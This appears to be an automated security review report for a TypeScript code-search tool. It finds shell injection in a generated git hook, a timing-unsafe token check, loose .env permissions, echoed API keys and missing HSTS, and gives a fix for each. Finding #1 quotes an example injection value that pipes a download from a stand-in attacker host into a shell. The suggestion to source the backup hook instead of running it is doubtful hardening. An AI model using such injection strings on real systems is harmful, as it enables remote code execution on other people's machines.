# Stage 2: Security Analysis

**Status:** FAIL

## Findings

### 1. [P2 — MEDIUM] — src/indexer/git-hook.ts:70 — Command injection via configPath in generated shell script

**Description:** The `installPostCommitHook` function interpolates the `configPath` parameter directly into a shell script string without sanitization:
```ts
const configArgument = configPath ? ` --config "${configPath}"` : "";
```
If `configPath` contains shell metacharacters (e.g., `"; curl evil.com | sh #`), an attacker with write access to the filesystem could inject arbitrary commands into the generated post-commit hook. The double-quoting provides some defense, but it does not guard against characters like `$`, backticks, `\`, or `!` inside double quotes in POSIX sh.

**Remediation:**
```ts
// Escape all shell-special characters before interpolation
const escapeShellArg = (value: string): string =>
  "'" + value.replace(/'/g, "'\\''") + "'";

const configArgument = configPath ? ` --config ${escapeShellArg(configPath)}` : "";
```

### 2. [P2 — MEDIUM] — src/indexer/git-hook.ts:75 — Backup hook path injection in generated shell script

**Description:** The `backupHookPath` (derived from `gitDir`, which itself comes from parsing the `.git` file's `gitdir:` directive) is interpolated into the shell script without escaping:
```ts
if [ -f "${backupHookPath}" ]; then
  sh "${backupHookPath}"
fi
```
A malicious `.git` file could point to a crafted path that, when interpolated into the shell script, leads to command execution. Additionally, executing an arbitrary backup file via `sh` is unsafe — the backup could contain arbitrary shell code.

**Remediation:**
```ts
// 1. Use single-quote escaping for backupHookPath
const escapeShellArg = (value: string): string =>
  "'" + value.replace(/'/g, "'\\''") + "'";

// 2. In the generated script, validate the backup hook before executing
const script = `#!/bin/sh
${HOOK_MARKER}
set -e
if [ -f ${escapeShellArg(backupHookPath)} ]; then
  . ${escapeShellArg(backupHookPath)}
fi
...
`;
// Consider using `.` (source) instead of `sh` for better control,
// or validate the backup file contains expected patterns.
```

### 3. [P2 — MEDIUM] — src/service/http.ts:83 — Non-timing-safe comparison for bearer token authorization

**Description:** The `isAuthorized` function uses a plain JavaScript string equality check (`===`) to compare the `Authorization` header against the expected bearer token:
```ts
const isAuthorized = (request: IncomingMessage, apiKey: string | undefined): boolean => {
  if (!apiKey) {
    return true;
  }
  const authorization = request.headers.authorization;
  return authorization === `Bearer ${apiKey}`;
};
```
While Node.js's `===` for strings is not guaranteed to be constant-time, in practice V8 may short-circuit, enabling timing side-channel attacks to progressively guess the API key byte-by-byte. This is a defense-in-depth issue; the risk is elevated if the service is exposed to untrusted networks.

**Remediation:**
```ts
import { timingSafeEqual } from "node:crypto";

const isAuthorized = (request: IncomingMessage, apiKey: string | undefined): boolean => {
  if (!apiKey) {
    return true;
  }
  const authorization = request.headers.authorization;
  const expected = `Bearer ${apiKey}`;
  if (typeof authorization !== "string" || authorization.length !== expected.length) {
    return false;
  }
  return timingSafeEqual(Buffer.from(authorization), Buffer.from(expected));
};
```

### 4. [P3 — LOW] — src/cli/setup-wizard.ts:197–207 — API keys written to .env file with world-readable permissions

**Description:** The setup wizard writes API keys to a `.env` file using `fs.writeFile` without explicitly setting restrictive file permissions:
```ts
await fs.writeFile(envPath, envLines.join("\n"), "utf8");
```
On Unix systems, the default umask typically creates files as `644` (world-readable). Any user on the same system could read the `.env` file and obtain API keys.

**Remediation:**
```ts
import fs from "node:fs/promises";

await fs.writeFile(envPath, envLines.join("\n"), {
  encoding: "utf8",
  mode: 0o600  // Owner read/write only
});
```

### 5. [P3 — LOW] — src/cli/setup-wizard.ts:76, 107, 113, 119 — API keys echoed to terminal via readline default values

**Description:** During interactive setup, existing API keys from `process.env` are passed as default values to the `ask` function:
```ts
const existingKey = process.env.CODERAG_GEMINI_API_KEY ?? process.env.CODERAG_GEMINI_AI_KEY;
geminiApiKey = await ask(rl, "Enter Gemini API key", existingKey);
```
The readline interface displays default values in the terminal, which may be captured by terminal scrollback, screen sharing, or session recording tools. API keys should be masked or not displayed.

**Remediation:**
```ts
// Do not display existing keys; instead indicate a key exists
if (existingKey) {
  geminiApiKey = await ask(rl, "Enter Gemini API key (leave blank to keep existing)", "");
  if (!geminiApiKey) geminiApiKey = existingKey;
} else {
  geminiApiKey = await ask(rl, "Enter Gemini API key");
}
```
Alternatively, use a masking library like `readline-sync` with `hideEchoBack: true`.

### 6. [P3 — LOW] — src/service/http.ts:36–43 — HSTS header only applied on encrypted sockets

**Description:** The `Strict-Transport-Security` header is only added when `request.socket.encrypted` is true:
```ts
if ("encrypted" in request.socket && request.socket.encrypted) {
  response.setHeader("strict-transport-security", "max-age=31536000; includeSubDomains");
}
```
Since CodeRag uses `http.createServer()` (not HTTPS), the socket will never be encrypted, meaning HSTS is never sent. If this service is placed behind a TLS-terminating reverse proxy, the proxy should set HSTS, but this should be documented. Without HSTS, users are vulnerable to SSL-stripping attacks when accessing the service directly over HTTPS.

**Remediation:**
```ts
// Always send HSTS if deployed behind a TLS-terminating proxy.
// The proxy sets X-Forwarded-Proto: https.
const isBehindTlsProxy = request.headers["x-forwarded-proto"] === "https";
if (("encrypted" in request.socket && request.socket.encrypted) || isBehindTlsProxy) {
  response.setHeader("strict-transport-security", "max-age=31536000; includeSubDomains");
}
```
Alternatively, document that HSTS must be configured at the reverse proxy level.

## Checks Performed

| Check | Result |
|-------|--------|
| Hardcoded secrets (API keys, passwords, tokens) | ✅ PASS — No hardcoded secrets in source. Keys loaded from env vars. |
| SQL injection | ✅ PASS — No SQL usage found in changed files. Uses parameterized LanceDB. |
| Command injection | ⚠️ FAIL — Shell script interpolation in git-hook.ts (Finding #1, #2) |
| XSS / DOM injection | ✅ PASS — No browser-rendered HTML in changed files. Pure JSON API. |
| Prototype pollution | ✅ PASS — Zod schema validation on all HTTP inputs. |
| Dangerous functions (eval, exec, Function, child_process) | ✅ PASS — None found in changed files. |
| Authentication / Authorization | ⚠️ FAIL — Non-timing-safe token comparison (Finding #3) |
| Path traversal | ✅ PASS — Path operations use `node:path` resolution; no user-controlled path passed to fs. |
| SSRF | ✅ PASS — No outbound HTTP requests with user-controlled URLs in changed files. |
| Unsafe deserialization | ✅ PASS — JSON.parse wrapped in try/catch; Zod validation applied after. |
| Open redirects | ✅ PASS — No redirect logic in changed files. |
| Secret exposure in logs | ✅ PASS — No API keys logged via console.log/error in changed files. |
| Secret exposure in env files | ⚠️ FAIL — .env written with default permissions (Finding #4) |
| Input validation | ✅ PASS — Zod schemas validate all HTTP request bodies. |
| Missing bounds checks | ✅ PASS — Request body size limited to 1MB; depth validated in CLI. |
| Dependency vulnerabilities | ✅ PASS — Dependencies pinned with lockfile. `@xenova/transformers` loaded via import only (no runtime exec in changed files). |
| Security headers | ⚠️ FAIL — HSTS never applied in practice for http.createServer (Finding #6) |
| Timing-safe auth comparison | ⚠️ FAIL — Finding #3 |

## Summary

| Severity | Count |
|----------|-------|
| P0 (Critical) | 0 |
| P1 (High) | 0 |
| P2 (Medium) | 3 |
| P3 (Low) | 3 |

**Overall: FAIL** — 3 medium and 3 low severity findings. No critical or high severity issues detected. The most actionable fix is the command injection risk in git-hook.ts (Findings #1 and #2), which should be addressed by proper shell argument escaping before interpolating file paths into generated shell scripts.
